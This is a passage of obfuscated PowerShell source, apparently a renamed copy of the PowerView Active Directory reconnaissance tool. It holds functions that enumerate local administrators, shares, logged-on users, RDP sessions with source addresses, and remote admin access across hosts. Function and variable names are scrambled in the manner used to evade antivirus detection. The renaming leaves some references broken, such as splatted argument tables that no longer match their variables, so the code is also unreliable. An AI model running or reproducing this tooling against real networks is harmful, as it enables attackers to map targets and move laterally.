        if ($PSBoundParameters['Credential']) { $AZcgOYJm99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $zLdPCUTB99['Domain'] = $jeGdZvYa99
            $AZcgOYJm99['Domain'] = $jeGdZvYa99
        }
        if ($HqefJcIL99 -eq 'All') {
            $zLdPCUTB99['Identity'] = '*'
        }
        elseif ($HqefJcIL99 -eq 'Domain') {
            $zLdPCUTB99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($HqefJcIL99 -eq 'DomainController') -or ($HqefJcIL99 -eq 'DC')) {
            $zLdPCUTB99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $zLdPCUTB99['Identity'] = $HqefJcIL99
        }
        $wniTqWCm99 = dishonesty @SearcherArguments
        ForEach ($GPO in $wniTqWCm99) {
            $YCOkMHvh99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $zavQEXuo99 =  @{
                'GptTmplPath' = $YCOkMHvh99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $zavQEXuo99['Credential'] = $DOZPHpup99 }
            adore @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function bevel {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $GxydJySm99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            if ($GxydJySm99 -eq 'API') {
                $LXYozoWJ99 = 1
                $dPkmWUmh99 = [IntPtr]::Zero
                $qNSwXUpX99 = 0
                $qtJxfnjk99 = 0
                $KKVFvobg99 = 0
                $sBoEOClb99 = $fJiOXvXs99::NetLocalGroupEnum($GucPfsvo99, $LXYozoWJ99, [ref]$dPkmWUmh99, -1, [ref]$qNSwXUpX99, [ref]$qtJxfnjk99, [ref]$KKVFvobg99)
                $FXdWquQC99 = $dPkmWUmh99.ToInt64()
                if (($sBoEOClb99 -eq 0) -and ($FXdWquQC99 -gt 0)) {
                    $yZQvREQI99 = $jxOErltE99::GetSize()
                    for ($i = 0; ($i -lt $qNSwXUpX99); $i++) {
                        $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                        $Info = $Jmdkrssj99 -as $jxOErltE99
                        $FXdWquQC99 = $Jmdkrssj99.ToInt64()
                        $FXdWquQC99 += $yZQvREQI99
                        $qapxisbo99 = New-Object PSObject
                        $qapxisbo99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                        $qapxisbo99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $qapxisbo99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $qapxisbo99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $qapxisbo99
                    }
                    $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
                }
                else {
                    Write-Verbose "[bevel] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
                }
            }
            else {
                $RWFGWeiD99 = [ADSI]"WinNT://$GucPfsvo99,computer"
                $RWFGWeiD99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $qapxisbo99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                    $Group | Add-Member Noteproperty 'GroupName' ($qapxisbo99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($qapxisbo99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($qapxisbo99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function chiding {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $sWPGjowW99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $GxydJySm99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            if ($GxydJySm99 -eq 'API') {
                $LXYozoWJ99 = 2
                $dPkmWUmh99 = [IntPtr]::Zero
                $qNSwXUpX99 = 0
                $qtJxfnjk99 = 0
                $KKVFvobg99 = 0
                $sBoEOClb99 = $fJiOXvXs99::NetLocalGroupGetMembers($GucPfsvo99, $sWPGjowW99, $LXYozoWJ99, [ref]$dPkmWUmh99, -1, [ref]$qNSwXUpX99, [ref]$qtJxfnjk99, [ref]$KKVFvobg99)
                $FXdWquQC99 = $dPkmWUmh99.ToInt64()
                $ztqsVgXN99 = @()
                if (($sBoEOClb99 -eq 0) -and ($FXdWquQC99 -gt 0)) {
                    $yZQvREQI99 = $ThxMHIak99::GetSize()
                    for ($i = 0; ($i -lt $qNSwXUpX99); $i++) {
                        $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                        $Info = $Jmdkrssj99 -as $ThxMHIak99
                        $FXdWquQC99 = $Jmdkrssj99.ToInt64()
                        $FXdWquQC99 += $yZQvREQI99
                        $dksPFgte99 = ''
                        $TZCIhLVr99 = $iVwkknTh99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$dksPFgte99);$KcubREEf99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($TZCIhLVr99 -eq 0) {
                            Write-Verbose "[chiding] Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
                        }
                        else {
                            $BlVyUnEr99 = New-Object PSObject
                            $BlVyUnEr99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                            $BlVyUnEr99 | Add-Member Noteproperty 'GroupName' $sWPGjowW99
                            $BlVyUnEr99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $BlVyUnEr99 | Add-Member Noteproperty 'SID' $dksPFgte99
                            $LvQgjAII99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $BlVyUnEr99 | Add-Member Noteproperty 'IsGroup' $LvQgjAII99
                            $BlVyUnEr99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $ztqsVgXN99 += $BlVyUnEr99
                        }
                    }
                    $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
                    $uRwEPMGG99 = $ztqsVgXN99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($uRwEPMGG99) {
                        $uRwEPMGG99 = $uRwEPMGG99.Substring(0, $uRwEPMGG99.LastIndexOf('-'))
                        $ztqsVgXN99 | ForEach-Object {
                            if ($_.SID -match $uRwEPMGG99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $ztqsVgXN99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $ztqsVgXN99
                }
                else {
                    Write-Verbose "[chiding] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
                }
            }
            else {
                try {
                    $CrZxLhyH99 = [ADSI]"WinNT://$GucPfsvo99/$sWPGjowW99,group"
                    $CrZxLhyH99.psbase.Invoke('Members') | ForEach-Object {
                        $BlVyUnEr99 = New-Object PSObject
                        $BlVyUnEr99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                        $BlVyUnEr99 | Add-Member Noteproperty 'GroupName' $sWPGjowW99
                        $ROivPAGR99 = ([ADSI]$_)
                        $tigmTVfc99 = $ROivPAGR99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $LvQgjAII99 = ($ROivPAGR99.SchemaClassName -like 'group')
                        if(([regex]::Matches($tigmTVfc99, '/')).count -eq 1) {
                            $tdSenyCN99 = $True
                            $Name = $tigmTVfc99.Replace('/', '\')
                        }
                        else {
                            $tdSenyCN99 = $False
                            $Name = $tigmTVfc99.Substring($tigmTVfc99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $BlVyUnEr99 | Add-Member Noteproperty 'AccountName' $Name
                        $BlVyUnEr99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($ROivPAGR99.InvokeGet('ObjectSID'),0)).Value)
                        $BlVyUnEr99 | Add-Member Noteproperty 'IsGroup' $LvQgjAII99
                        $BlVyUnEr99 | Add-Member Noteproperty 'IsDomain' $tdSenyCN99
                        $BlVyUnEr99
                    }
                }
                catch {
                    Write-Verbose "[chiding] Error for $GucPfsvo99 : $_"
                }
            }
        }
    }
    
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function blouse {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $LXYozoWJ99 = 1
            $dPkmWUmh99 = [IntPtr]::Zero
            $qNSwXUpX99 = 0
            $qtJxfnjk99 = 0
            $KKVFvobg99 = 0
            $sBoEOClb99 = $fJiOXvXs99::NetShareEnum($GucPfsvo99, $LXYozoWJ99, [ref]$dPkmWUmh99, -1, [ref]$qNSwXUpX99, [ref]$qtJxfnjk99, [ref]$KKVFvobg99)
            $FXdWquQC99 = $dPkmWUmh99.ToInt64()
            if (($sBoEOClb99 -eq 0) -and ($FXdWquQC99 -gt 0)) {
                $yZQvREQI99 = $hJcMUUQG99::GetSize()
                for ($i = 0; ($i -lt $qNSwXUpX99); $i++) {
                    $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                    $Info = $Jmdkrssj99 -as $hJcMUUQG99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $FXdWquQC99 = $Jmdkrssj99.ToInt64()
                    $FXdWquQC99 += $yZQvREQI99
                    $Share
                }
                $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
            }
            else {
                Write-Verbose "[blouse] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
            }
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function cheerily {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $LXYozoWJ99 = 1
            $dPkmWUmh99 = [IntPtr]::Zero
            $qNSwXUpX99 = 0
            $qtJxfnjk99 = 0
            $KKVFvobg99 = 0
            $sBoEOClb99 = $fJiOXvXs99::NetWkstaUserEnum($GucPfsvo99, $LXYozoWJ99, [ref]$dPkmWUmh99, -1, [ref]$qNSwXUpX99, [ref]$qtJxfnjk99, [ref]$KKVFvobg99)
            $FXdWquQC99 = $dPkmWUmh99.ToInt64()
            if (($sBoEOClb99 -eq 0) -and ($FXdWquQC99 -gt 0)) {
                $yZQvREQI99 = $BFaMvVzx99::GetSize()
                for ($i = 0; ($i -lt $qNSwXUpX99); $i++) {
                    $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                    $Info = $Jmdkrssj99 -as $BFaMvVzx99
                    $oKMCiKka99 = $Info | Select-Object *
                    $oKMCiKka99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                    $oKMCiKka99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $FXdWquQC99 = $Jmdkrssj99.ToInt64()
                    $FXdWquQC99 += $yZQvREQI99
                    $oKMCiKka99
                }
                $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
            }
            else {
                Write-Verbose "[cheerily] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
            }
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function disservice {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $LXYozoWJ99 = 10
            $dPkmWUmh99 = [IntPtr]::Zero
            $qNSwXUpX99 = 0
            $qtJxfnjk99 = 0
            $KKVFvobg99 = 0
            $sBoEOClb99 = $fJiOXvXs99::NetSessionEnum($GucPfsvo99, '', $rYdFULpQ99, $LXYozoWJ99, [ref]$dPkmWUmh99, -1, [ref]$qNSwXUpX99, [ref]$qtJxfnjk99, [ref]$KKVFvobg99)
            $FXdWquQC99 = $dPkmWUmh99.ToInt64()
            if (($sBoEOClb99 -eq 0) -and ($FXdWquQC99 -gt 0)) {
                $yZQvREQI99 = $nnGuwnqw99::GetSize()
                for ($i = 0; ($i -lt $qNSwXUpX99); $i++) {
                    $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                    $Info = $Jmdkrssj99 -as $nnGuwnqw99
                    $JSaXNbjy99 = $Info | Select-Object *
                    $JSaXNbjy99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                    $JSaXNbjy99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $FXdWquQC99 = $Jmdkrssj99.ToInt64()
                    $FXdWquQC99 += $yZQvREQI99
                    $JSaXNbjy99
                }
                $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
            }
            else {
                Write-Verbose "[disservice] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
            }
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function Nash {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$kyzUdCPm99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $rYdFULpQ99 = bandaging -ObjectSID $_ -vxxrLejt99 'DomainSimple'
                    if ($rYdFULpQ99) {
                        $rYdFULpQ99, $BUwbCXsa99 = $rYdFULpQ99.Split('@')
                    }
                    else {
                        $rYdFULpQ99 = $_
                        $BUwbCXsa99 = $Null
                    }
                    $VvKwOsqm99 = New-Object PSObject
                    $VvKwOsqm99 | Add-Member Noteproperty 'ComputerName' "$kyzUdCPm99"
                    $VvKwOsqm99 | Add-Member Noteproperty 'UserDomain' $BUwbCXsa99
                    $VvKwOsqm99 | Add-Member Noteproperty 'UserName' $rYdFULpQ99
                    $VvKwOsqm99 | Add-Member Noteproperty 'UserSID' $_
                    $VvKwOsqm99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $VvKwOsqm99
                }
            }
            catch {
                Write-Verbose "[Nash] Error opening remote registry on '$kyzUdCPm99' : $_"
            }
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function uncleanest {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $tHuiWZXJ99 = $CrMxeVWd99::WTSOpenServerEx($GucPfsvo99)
            if ($tHuiWZXJ99 -ne 0) {
                $LvGoVnIT99 = [IntPtr]::Zero
                $XNgAiHNW99 = 0
                $sBoEOClb99 = $CrMxeVWd99::WTSEnumerateSessionsEx($tHuiWZXJ99, [ref]1, 0, [ref]$LvGoVnIT99, [ref]$XNgAiHNW99);$KcubREEf99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $FXdWquQC99 = $LvGoVnIT99.ToInt64()
                if (($sBoEOClb99 -ne 0) -and ($FXdWquQC99 -gt 0)) {
                    $yZQvREQI99 = $OiYydDav99::GetSize()
                    for ($i = 0; ($i -lt $XNgAiHNW99); $i++) {
                        $Jmdkrssj99 = New-Object System.Intptr -ArgumentList $FXdWquQC99
                        $Info = $Jmdkrssj99 -as $OiYydDav99
                        $ZQbOJsku99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $ZQbOJsku99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $ZQbOJsku99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                        }
                        $ZQbOJsku99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $ZQbOJsku99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $ZQbOJsku99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $ZQbOJsku99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $ZQbOJsku99 | Add-Member Noteproperty 'State' $Info.State
                        $EgMBWJxy99 = [IntPtr]::Zero
                        $gNlXiysG99 = 0
                        $TZCIhLVr99 = $CrMxeVWd99::WTSQuerySessionInformation($tHuiWZXJ99, $Info.SessionID, 14, [ref]$EgMBWJxy99, [ref]$gNlXiysG99);$nuWiOLiI99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($TZCIhLVr99 -eq 0) {
                            Write-Verbose "[uncleanest] Error: $(([ComponentModel.Win32Exception] $nuWiOLiI99).Message)"
                        }
                        else {
                            $AhWVgFJq99 = $EgMBWJxy99.ToInt64()
                            $brevzDpN99 = New-Object System.Intptr -ArgumentList $AhWVgFJq99
                            $Info2 = $brevzDpN99 -as $vpNiFEyv99
                            $yaAIDbQr99 = $Info2.Address
                            if ($yaAIDbQr99[2] -ne 0) {
                                $yaAIDbQr99 = [String]$yaAIDbQr99[2]+'.'+[String]$yaAIDbQr99[3]+'.'+[String]$yaAIDbQr99[4]+'.'+[String]$yaAIDbQr99[5]
                            }
                            else {
                                $yaAIDbQr99 = $Null
                            }
                            $ZQbOJsku99 | Add-Member Noteproperty 'SourceIP' $yaAIDbQr99
                            $ZQbOJsku99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $ZQbOJsku99
                            $Null = $CrMxeVWd99::WTSFreeMemory($EgMBWJxy99)
                            $FXdWquQC99 += $yZQvREQI99
                        }
                    }
                    $Null = $CrMxeVWd99::WTSFreeMemoryEx(2, $LvGoVnIT99, $XNgAiHNW99)
                }
                else {
                    Write-Verbose "[uncleanest] Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
                }
                $Null = $CrMxeVWd99::WTSCloseServer($tHuiWZXJ99)
            }
            else {
                Write-Verbose "[uncleanest] Error opening the Remote Desktop Session Host (RD Session Host) server for: $kyzUdCPm99"
            }
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function illegitimate {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $tHuiWZXJ99 = $iVwkknTh99::OpenSCManagerW("\\$GucPfsvo99", 'ServicesActive', 0xF003F);$KcubREEf99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $ucRMUOlO99 = New-Object PSObject
            $ucRMUOlO99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
            if ($tHuiWZXJ99 -ne 0) {
                $Null = $iVwkknTh99::CloseServiceHandle($tHuiWZXJ99)
                $ucRMUOlO99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[illegitimate] Error: $(([ComponentModel.Win32Exception] $KcubREEf99).Message)"
                $ucRMUOlO99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $ucRMUOlO99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $ucRMUOlO99
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function censoring {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $GrTBJoNj99 = Salem -DOZPHpup99 $DOZPHpup99
        }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            if ($GucPfsvo99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $uaBrbSJB99 = $GucPfsvo99
                $GucPfsvo99 = [System.Net.Dns]::GetHostByAddress($GucPfsvo99) | Select-Object -ExpandProperty HostName
            }
            else {
                $uaBrbSJB99 = @(glares -kyzUdCPm99 $GucPfsvo99)[0].IPAddress
            }
            $dPkmWUmh99 = [IntPtr]::Zero
            $sBoEOClb99 = $fJiOXvXs99::DsGetSiteName($GucPfsvo99, [ref]$dPkmWUmh99)
            $hRJGaLjQ99 = New-Object PSObject
            $hRJGaLjQ99 | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
            $hRJGaLjQ99 | Add-Member Noteproperty 'IPAddress' $uaBrbSJB99
            if ($sBoEOClb99 -eq 0) {
                $TQljdANP99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($dPkmWUmh99)
                $hRJGaLjQ99 | Add-Member Noteproperty 'SiteName' $TQljdANP99
            }
            else {
                Write-Verbose "[censoring] Error: $(([ComponentModel.Win32Exception] $sBoEOClb99).Message)"
                $hRJGaLjQ99 | Add-Member Noteproperty 'SiteName' ''
            }
            $hRJGaLjQ99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $fJiOXvXs99::NetApiBufferFree($dPkmWUmh99)
            $hRJGaLjQ99
        }
    }
    END {
        if ($GrTBJoNj99) {
            contemptuous -ojJXfOPB99 $GrTBJoNj99
        }
    }
}
function trillions {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            try {
                $BlMYAAzq99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $GucPfsvo99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $BlMYAAzq99['Credential'] = $DOZPHpup99 }
                $fSyEdHcf99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $BnDGLJHy99 = $fSyEdHcf99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $sAFkCyLr99 = $fSyEdHcf99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($sAFkCyLr99 -and ($sAFkCyLr99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($sAFkCyLr99)
                    }
                    catch {
                        Write-Warning "[trillions] Error connecting to AutoConfigURL : $sAFkCyLr99"
                    }
                }
                if ($BnDGLJHy99 -or $sAFkCyLr99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $GucPfsvo99
                    $Out | Add-Member Noteproperty 'ProxyServer' $BnDGLJHy99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $sAFkCyLr99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[trillions] No proxy settings found for $kyzUdCPm99"
                }
            }
            catch {
                Write-Warning "[trillions] Error enumerating proxy settings for $kyzUdCPm99 : $_"
            }
        }
    }
}
function dropsy {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
